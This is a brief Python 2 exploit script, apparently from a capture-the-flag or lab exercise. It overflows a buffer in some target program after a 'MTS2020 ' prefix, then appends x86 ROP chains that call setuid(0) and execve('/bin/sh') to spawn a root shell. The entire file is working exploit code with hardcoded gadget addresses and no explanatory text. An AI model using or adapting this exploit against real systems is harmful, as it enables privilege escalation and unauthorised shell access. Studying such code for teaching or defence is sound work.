#!/usr/bin/python2
# -*- coding: utf-8 -*-

import sys
from struct import *

buffer  = "MTS2020 "
buffer += "A" * 152

# ROP Chain setuid
buffer += pack('<L', 0x7274047d) # xor eax, eax ; ret
buffer += pack('<L', 0x72740526) # add eax, 0x17 ; ret
buffer += pack('<L', 0x72740493) # xor ebx, ebx ; ret
buffer += pack('<L', 0x72740508) # int 0x80 ; ret

# ROP Chain execve
buffer += pack('<L', 0x7274047d) # xor eax, eax ; ret
buffer += pack('<L', 0x72740501) # add eax, 0xb ; ret
buffer += pack('<L', 0x72740375) # pop ebx ; ret
buffer += pack('<L', 0x72741008) # EndereÃ§o do /bin/sh
buffer += pack('<L', 0x727404a9) # xor ecx, ecx ; ret
buffer += pack('<L', 0x727404bf) # xor edx, edx ; ret
buffer += pack('<L', 0x72740508) # int 0x80 ; ret

print buffer
